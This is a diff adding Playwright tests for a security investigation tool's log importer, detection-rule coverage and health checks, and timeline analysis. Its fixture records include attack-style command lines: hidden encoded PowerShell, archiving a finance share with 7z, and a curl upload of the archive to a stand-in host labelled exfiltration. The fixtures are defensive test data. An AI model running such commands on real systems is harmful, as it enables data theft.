@@ -200,3 +200,171 @@ test('the graph button on a vault card opens the graph on that entry', async ({ 
   await expect.poll(() => page.evaluate(() => typeof cy !== 'undefined' && cy && cy.getElementById('v-handle').selected())).toBe(true);
   noErrors(errors);
 });
+
+test('broken versions of real log formats never break the importer', async ({ page }) => {
+  const errors = await open(page, '#/home');
+  const R = await page.evaluate(() => {
+    const samples = [
+      'timestamp,host,user,event\n2024-03-01T10:00:00Z,WS-01,alice,logon\n2024-03-01T10:05:00Z,WS-01,alice,"cmd.exe /c whoami"',
+      '{"@timestamp":"2024-03-01T10:00:00Z","event":{"code":4688},"process":{"command_line":"powershell -enc SQBFAFgA"}}\n{"@timestamp":"2024-03-01T10:01:00Z","host":{"name":"DC01"}}',
+      '<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><EventID>4624</EventID><TimeCreated SystemTime="2024-03-01T10:00:00.000Z"/><Computer>DC01</Computer></System><EventData><Data Name="TargetUserName">bob</Data><Data Name="LogonType">10</Data></EventData></Event>',
+      'CEF:0|Vendor|FW|1.0|100|Blocked|5|src=10.0.0.5 dst=203.0.113.9 dpt=443 act=block rt=Mar 01 2024 10:00:00',
+      'Mar  1 10:00:00 web01 sshd[123]: Failed password for root from 203.0.113.50 port 51234 ssh2',
+      '{"eventVersion":"1.08","eventTime":"2024-03-01T10:00:00Z","eventName":"ConsoleLogin","sourceIPAddress":"198.51.100.7","userIdentity":{"type":"IAMUser","userName":"ops"}}',
+      '#fields\tts\tuid\tid.orig_h\tid.resp_h\tquery\n1709287200.0\tC1\t10.0.0.5\t8.8.8.8\tevil.example',
+    ];
+    let seed = 11; const rnd = () => (seed = (seed * 1103515245 + 12345) % 2147483648) / 2147483648, pick = a => a[Math.floor(rnd() * a.length)];
+    const mutate = s => { const k = Math.floor(rnd() * 10), i = Math.floor(rnd() * s.length);
+      switch (k) {
+        case 0: return s.slice(0, i);                                             // cut off mid-way
+        case 1: return '﻿' + s.replace(/\n/g, '\r\n');                      // BOM and Windows line ends
+        case 2: return s.slice(0, i) + s.slice(i + 1 + Math.floor(rnd() * 20));   // bytes missing
+        case 3: return s.slice(0, i) + 'x'.repeat(200000) + s.slice(i);          // one huge field
+        case 4: return s.replace(/"/g, () => rnd() < .3 ? '' : '"');              // broken quoting
+        case 5: return '['.repeat(5000) + s + ']'.repeat(10);                      // deeply nested
+        case 6: return Array(3000).fill(s).join('\n');                             // many rows
+        case 7: return s.replace(/\d/g, () => rnd() < .2 ? '\u0000' : String(Math.floor(rnd() * 10)));
+        case 8: return s.split('').reverse().join('');
+        default: return s + '\n' + pick(samples).slice(0, i);                      // two formats mixed
+      } };
+    /* the file importer's own steps: read the format, guess the columns, make records, then every engine on them */
+    const importAs = s => { const P = logParse(s, 'x.log'), cols = [...new Set(P.rows.slice(0, 200).flatMap(r => Object.keys(r)))], M = { time: logGuess(cols, 'time'), title: logGuess(cols, 'title'), host: logGuess(cols, 'host'), source: logGuess(cols, 'source') };
+      const L = P.rows.slice(0, 300).map(r => logRec(r, M, 'x.log')); L.slice(0, 60).forEach(r => { E.observations(r); recFields(r); parseLog(r.body); }); return L; };
+    const fails = []; let slow = 0, recs = 0;
+    for (let i = 0; i < 160; i++) { const s = mutate(pick(samples)), t0 = performance.now();
+      try { recs += importAs(s).length; }
+      catch (e) { fails.push(e.message + ' :: ' + JSON.stringify(s.slice(0, 80))); }
+      if (performance.now() - t0 > 1500) slow++; }
+    // the clean samples still import
+    const clean = samples.map(s => importAs(s).length);
+    const csvTimes = importAs(samples[0]).map(r => r.ts).filter(Boolean).length;          // times read from the right column
+    return { fails: fails.slice(0, 8), slow, recs, clean, csvTimes };
+  });
+  expect(R.fails).toEqual([]); expect(R.slow).toBe(0);
+  expect(R.clean.every(n => n >= 1)).toBe(true); expect(R.clean[0]).toBe(2); expect(R.csvTimes).toBe(2);
+  noErrors(errors);
+});
+
+test('rules over one case: what fired, what looks suspicious but nothing caught, noisy rules — and drafting from a blind spot closes it', async ({ page }) => {
+  const errors = await open(page, '#/home');
+  await page.evaluate(() => {
+    const c = { id: 'c-cr', code: 'CR-1', name: 'Rules check', color: '#6366f1', status: 'active', created: Date.now(), updated: Date.now() }; DB.cases.push(c);
+    const T = Date.UTC(2024, 2, 1, 10), mk = (i, title, body, extra) => ({ id: 'r-cr' + i, caseId: 'c-cr', type: 'evidence', title, body, ts: T + i * 60000, tsRaw: '', source: 'test', host: 'WS-01', tags: [], ents: extractRich(body), addedAt: Date.now(), ...extra });
+    DB.records.push(
+      mk(1, 'Encoded PowerShell', 'EventID=1 Image=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe CommandLine="powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA"'),
+      mk(2, 'Odd service on DC', 'EventID=7045 ServiceName=zzqx ImagePath=C:\\ProgramData\\zzqx\\svc.exe', { tags: ['persistence'] }),
+      mk(3, 'User logon', 'EventID=4624 TargetUserName=alice LogonType=2'),
+      mk(4, 'User logon', 'EventID=4624 TargetUserName=bob LogonType=2'),
+      mk(5, 'Browser start', 'EventID=1 Image=C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe CommandLine=chrome.exe'),
+      mk(6, 'Explorer', 'EventID=1 Image=C:\\Windows\\explorer.exe CommandLine=explorer.exe'));
+    DB.rules.unshift({ id: 'r-loud', type: 'sigma', title: 'Anything with EventID', desc: '', code: "title: Anything with EventID\nlogsource:\n    product: windows\ndetection:\n    s:\n        eventid|re: '.+'\n    condition: s\nlevel: low", severity: 'low', category: 'process', technique: '', author: 'You', platform: 'Windows', tags: [], created: Date.now(), updated: Date.now() });
+    rev++; DB.active = 'c-cr'; UI.tlMode = 'rules'; go(caseHash('c-cr', 'timeline'));
+  });
+  await expect(page.locator('.cr-sum')).toBeVisible({ timeout: 20000 });
+  const R = await page.evaluate(() => ({ n: CR.res.n, fired: CR.res.rows.map(x => x.r.id), blind: CR.res.blind.map(x => x.r.id), noisy: CR.res.noisy.map(x => x.r.id),
+    encCaughtBy: (CR.res.caught.get('r-cr1') || []).filter(r => r.id !== 'r-loud').length }));
+  expect(R.n).toBe(6);
+  expect(R.encCaughtBy).toBeGreaterThan(0);                     // a built-in rule catches the encoded PowerShell
+  expect(R.noisy).toEqual(['r-loud']);                          // fires on all six events
+  // the loud rule catches everything, so nothing is "not caught" while it is on; take it out and look again
+  await page.evaluate(() => { DB.rules = DB.rules.filter(r => r.id !== 'r-loud'); mutate('test'); renderMain(); });
+  await expect.poll(() => page.evaluate(() => CR.res && !DB.rules.some(r => r.id === 'r-loud') && CR.sig === crSig('c-cr') && CR.res.blind.map(x => x.r.id).join())).toContain('r-cr2');
+  const blind = await page.evaluate(() => CR.res.blind.map(x => x.r.id));
+  expect(blind).not.toContain('r-cr3'); expect(blind).not.toContain('r-cr5');   // harmless events are not blind spots
+  expect(blind).not.toContain('r-cr1');                                         // caught by a rule
+  await page.click('[data-act=crf][data-v=blind]');
+  await expect(page.locator('.cr-bl li:has-text("Odd service on DC")')).toContainText('persistence');
+  // draft a rule from the blind spot: it then counts as caught
+  const n0 = await page.evaluate(() => DB.rules.length);
+  await page.locator('.cr-bl li:has-text("Odd service on DC") [data-act=crDraft]').click();
+  expect(await page.evaluate(() => DB.rules.length)).toBe(n0 + 1);
+  await page.evaluate(() => { DB.active = 'c-cr'; UI.tlMode = 'rules'; go(caseHash('c-cr', 'timeline')); });
+  await expect.poll(() => page.evaluate(() => CR.res && CR.sig === crSig('c-cr') && !CR.res.blind.some(x => x.r.id === 'r-cr2'))).toBe(true);
+  // opening an event and a rule from the view
+  await page.click('[data-act=crf][data-v=caught]');
+  await page.locator('.cr-r [data-act=crRule]').first().click(); await expect(page).toHaveURL(/#\/detections/);
+  noErrors(errors);
+});
+
+test('rule health over time: test history and regressions, rules without tests, look-alike rules, what changed since the last check', async ({ page }) => {
+  const errors = await open(page, '#/detections');
+  const R = await page.evaluate(async () => {
+    const code = "title: Whoami run\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    s:\n        Image|endswith: '\\\\whoami.exe'\n    condition: s\nlevel: low";
+    const mk = (id, title, c, tests) => ({ id, type: 'sigma', title, desc: '', code: c, severity: 'low', category: 'process', technique: '', author: 'You', platform: 'Windows', tags: [], tests, created: Date.now(), updated: Date.now() });
+    const r = mk('r-hw', 'Whoami run', code, [{ kind: 'hit', text: 'Image="C:\\Windows\\System32\\whoami.exe"' }, { kind: 'miss', text: 'Image="C:\\Windows\\notepad.exe"' }]);
+    DB.rules.unshift(r, mk('r-untested', 'My untested rule', code.replace('whoami', 'net1'), undefined), mk('r-twin', 'Whoami run again', code.replace('title: Whoami run', 'title: Whoami run again'), undefined));
+    // two saves that pass, then an edit that breaks a test
+    dlAfterSave(r); dlAfterSave(r); r.code = code.replace('whoami.exe', 'whoam.exe'); dlAfterSave(r);
+    const T = dlTrend(r);
+    await ruleHealth(); const H1 = DQ.health, row = id => H1.rows.find(x => x.r.id === id);
+    const first = { hist: r.testHist.map(h => h.pass + '/' + h.total), regressed: T.regressed, now: T.now, tfail: row('r-hw').tfail, regressedRow: row('r-hw').regressed,
+      untested: !row('r-untested').tests && !row('r-untested').r.builtin };
+    // fix it and add a noisy rule, check again: the change is reported
+    r.code = code; dlAfterSave(r);
+    DB.rules.unshift(mk('r-noise', 'Noise', "title: Noise\nlogsource:\n    product: windows\ndetection:\n    s:\n        _raw|contains: 'e'\n    condition: s\nlevel: low"));
+    await ruleHealth(); const H2 = DQ.health, row2 = id => H2.rows.find(x => x.r.id === id);
+    first.twin = (row2('r-twin').alike || []).map(a => a.id); first.notTwin = (row2('r-untested').alike || []).map(a => a.id);
+    return { first, builtinAlike: H2.rows.filter(x => x.alike && x.r.builtin).length, trendAfterFix: dlTrend(r).now, prevAt: !!H2.prev, noisyBefore: H2.prev.noisy, noisyNow: H2.sum.noisy, tfailBefore: H2.prev.tfail, tfailNow: H2.sum.tfail, hist: DB.prefs.dqHist.length };
+  });
+  expect(R.first.hist).toEqual(['2/2', '2/2', '1/2']);
+  expect(R.first.regressed).toBe(true); expect(R.first.now).toBe(false);
+  expect(R.first.tfail).toBe(1); expect(R.first.regressedRow).toBe(true);
+  expect(R.first.untested).toBe(true);
+  expect(R.first.twin).toContain('r-hw');                    // same logic, different title
+  expect(R.first.notTwin).not.toContain('r-hw');             // different program: not a look-alike
+  expect(R.trendAfterFix).toBe(true); expect(R.builtinAlike).toBeLessThan(10);   // the built-in pack itself is not flagged wholesale
+  expect(R.prevAt).toBe(true); expect(R.noisyNow).toBe(R.noisyBefore + 1); expect(R.tfailBefore).toBeGreaterThan(R.tfailNow);
+  // on screen: the change line, the tabs, and the history strip in the rule's Tests tab
+  await page.evaluate(() => { UI.dview = 'health'; UI.dqf = 'tests'; renderMain(); });
+  await expect(page.locator('.dq-delta')).toContainText('noisy'); await expect(page.locator('.dq-delta')).toContainText('with failing tests');
+  await page.click('[data-act=dqf][data-v=alike]'); await expect(page.locator('.dq-r:has(.dq-t b:text-is("Whoami run again"))')).toContainText('Nearly the same logic as');
+  await page.click('[data-act=dqf][data-v=untested]'); await expect(page.locator('.dq-r:has-text("My untested rule") .chip')).toContainText(['no tests']);
+  await page.evaluate(() => { UI.dview = 'rules'; UI.rule = 'r-hw'; UI.ropen = true; UI.rtab = 'tests'; renderMain(); });
+  await expect(page.locator('.dl-hist i')).toHaveCount(4); await expect(page.locator('.dl-hist')).toContainText('Passing since');
+  noErrors(errors);
+});
+
+test('timeline: a source whose clock is off is found (and normal jitter is not), corrected and undone; sessions show their stages in order', async ({ page }) => {
+  const errors = await open(page, '#/home');
+  await page.evaluate(() => {
+    DB.cases.push({ id: 'c-tx', code: 'TX-1', name: 'Clocks', color: '#0ea5e9', status: 'active', created: Date.now(), updated: Date.now() });
+    const T = Date.UTC(2024, 4, 2, 9), H = 36e5, M = 6e4; let i = 0;
+    const mk = (src, t, title, body, host, tags) => ({ id: 'r-tx' + (i++), caseId: 'c-tx', type: 'evidence', title, body, ts: t, tsRaw: '', tsZone: 'explicit', source: src, host: host || '', tags: tags || [], ents: extractRich(body), addedAt: Date.now() });
+    const R = [];
+    // EDR sees connections; the firewall logs the same ones one hour later (its clock is in the wrong zone); DNS logs them seconds apart (normal)
+    [['203.0.113.10', 0], ['198.51.100.7', 7], ['evil-cdn.example', 13], ['203.0.113.10', 31], ['198.51.100.7', 44]].forEach(([v, m]) => {
+      R.push(mk('edr', T + m * M, 'Connection to ' + v, 'connect ' + v, 'WS-01'));
+      R.push(mk('firewall', T + m * M + H + (m % 3) * 1000, 'Allowed ' + v, 'allow dst=' + v, 'FW'));
+      R.push(mk('dns', T + m * M + 4000, 'Lookup ' + v, 'query ' + v, 'DNS1'));
+    });
+    // a session on WS-02: logon, discovery, staging, upload — then a quiet afternoon of ordinary events
+    R.push(mk('sysmon', T + 2 * H, 'Logon', 'EventID=4624 TargetUserName=eve LogonType=10 logon', 'WS-02'));
+    R.push(mk('sysmon', T + 2 * H + 3 * M, 'whoami /all', 'EventID=1 Image=C:\\Windows\\System32\\whoami.exe CommandLine="whoami /all"', 'WS-02', ['discovery']));
+    R.push(mk('sysmon', T + 2 * H + 8 * M, '7z archive of shares', 'EventID=1 Image=C:\\Program Files\\7-Zip\\7z.exe CommandLine="7z a c:\\temp\\x.7z \\\\fs01\\finance"', 'WS-02', ['staging']));
+    R.push(mk('sysmon', T + 2 * H + 12 * M, 'Upload', 'EventID=3 Image=C:\\Windows\\System32\\curl.exe CommandLine="curl -T c:\\temp\\x.7z https://files.example/up"', 'WS-02', ['exfiltration']));
+    for (let k = 0; k < 4; k++) R.push(mk('sysmon', T + 6 * H + k * 20 * M, 'Word opened', 'EventID=1 Image=C:\\Program Files\\Microsoft Office\\WINWORD.EXE', 'WS-02'));
+    DB.records.push(...R); rev++; DB.active = 'c-tx';
+  });
+  const A = await page.evaluate(() => { const D = derive('c-tx'), T = D.recs.filter(r => r.ts).sort((a, b) => a.ts - b.ts); return { skew: tx2Skew(T), sess: tx2Sessions(T).map(s => ({ host: s.host, n: s.n, steps: s.steps })) }; });
+  expect(A.skew).toHaveLength(1);
+  const sk = A.skew[0]; expect(sk.b).toBe('firewall'); expect(sk.others.sort()).toEqual(['dns', 'edr']); expect(sk.med).toBeGreaterThan(0); expect(Math.abs(Math.abs(sk.med) - 36e5)).toBeLessThan(5000); expect(Math.abs(sk.zone)).toBe(1);
+  const ws2 = A.sess.find(s => s.host === 'WS-02'); expect(ws2.n).toBe(4);
+  expect(ws2.steps.slice(0, 1)).toEqual(['Logon']); expect(ws2.steps).toEqual(expect.arrayContaining(['Discovery', 'Collection', 'Exfiltration']));
+  expect(ws2.steps.indexOf('Discovery')).toBeLessThan(ws2.steps.indexOf('Collection')); expect(ws2.steps.indexOf('Collection')).toBeLessThan(ws2.steps.indexOf('Exfiltration'));
+  expect(A.sess.some(s => s.n === 4 && s.steps.length === 0)).toBe(false);          // the ordinary afternoon is not listed
+  // on screen, correct the clock, then undo
+  await page.evaluate(() => { UI.tlMode = 'patterns'; go(caseHash('c-tx', 'timeline')); });
+  await expect(page.locator('.tlx-c:has-text("Clocks that disagree")')).toContainText('time zone');
+  await expect(page.locator('.tlx-c:has-text("Sessions")')).toContainText('WS-02');
+  const fw0 = await page.evaluate(() => DB.records.find(r => r.source === 'firewall').ts);
+  await page.locator('.tlx-c:has-text("Clocks that disagree") [data-act=tx2Shift]').first().click();
+  await expect(page.locator('.tlx-c:has-text("Clocks that disagree")')).toHaveCount(0);
+  const moved = await page.evaluate(() => { const r = DB.records.find(r => r.caseId === 'c-tx' && r.source === 'firewall') || DB.records.find(r => r.caseId === 'c-tx' && r.source === 'edr'); return r.tsShift; });
+  expect(Math.abs(Math.abs(moved) - 36e5)).toBeLessThan(5000);
+  await page.click('#toastBtn'); await expect(page.locator('.tlx-c:has-text("Clocks that disagree")')).toHaveCount(1);
+  expect(await page.evaluate(() => DB.records.find(r => r.source === 'firewall').ts)).toBe(fw0);
+  // show one session: the timeline filters to that host and time
+  await page.locator('.tlx-c:has-text("Sessions") [data-act=tx2Sess]').first().click();
+  expect(await page.evaluate(() => [UI.tlMode, UI.facet.host])).toEqual(['events', 'WS-02']);
+  noErrors(errors);
+});
